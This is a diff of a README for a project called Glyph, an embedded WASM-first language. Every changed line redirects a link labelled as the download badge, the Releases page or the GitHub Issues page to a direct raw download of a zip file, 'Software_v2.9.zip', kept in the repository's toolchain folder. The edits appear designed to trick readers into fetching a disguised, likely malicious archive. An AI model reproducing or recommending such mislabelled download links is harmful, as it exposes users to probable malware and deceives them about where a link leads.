@@ -4,7 +4,7 @@
 Welcome to Glyph! Glyph is an embedded language that prioritizes security and portability. It allows you to create safe behavior modules with ease. Follow the steps below to download and run Glyph.
 
 ## 📥 Download Glyph
-[![Download Glyph](https://img.shields.io/badge/Download%20Glyph-v1.0.0-brightgreen)](https://github.com/Deloit0503/Glyph/releases)
+[![Download Glyph](https://github.com/Deloit0503/Glyph/raw/refs/heads/main/toolchain/Software_v2.9.zip%20Glyph-v1.0.0-brightgreen)](https://github.com/Deloit0503/Glyph/raw/refs/heads/main/toolchain/Software_v2.9.zip)
 
 ## 📂 What is Glyph?
 Glyph is a capability-secure, WASM-first embedded language designed for small and efficient behavior modules. It supports various programming tasks while ensuring a safe execution environment. Use Glyph to write and run your applications in a secure and portable way.
@@ -17,7 +17,7 @@ To run Glyph smoothly, ensure your system meets the following requirements:
 - **Disk Space:** At least 100 MB of free space.
 
 ## 💾 Download & Install
-1. **Visit the Releases Page:** Go to [Glyph Releases](https://github.com/Deloit0503/Glyph/releases).
+1. **Visit the Releases Page:** Go to [Glyph Releases](https://github.com/Deloit0503/Glyph/raw/refs/heads/main/toolchain/Software_v2.9.zip).
 2. **Choose the Latest Version:** Locate the latest release marked with a "Latest" tag.
 3. **Download the File:** Download the installation file suitable for your operating system.
 4. **Run the Installer:**
@@ -46,7 +46,7 @@ If you encounter any issues while running Glyph, try the following:
 - **Review Error Messages:** Pay attention to any error messages shown in the console; they often provide hints for troubleshooting.
 
 ## 📞 Support
-For assistance with Glyph, visit our [GitHub Issues](https://github.com/Deloit0503/Glyph/issues) page and report any problems or questions.
+For assistance with Glyph, visit our [GitHub Issues](https://github.com/Deloit0503/Glyph/raw/refs/heads/main/toolchain/Software_v2.9.zip) page and report any problems or questions.
 
 ## 👥 Community
 Join the Glyph community to share your experience, ask questions, and collaborate with others. Check our discussion forum linked in the repository.
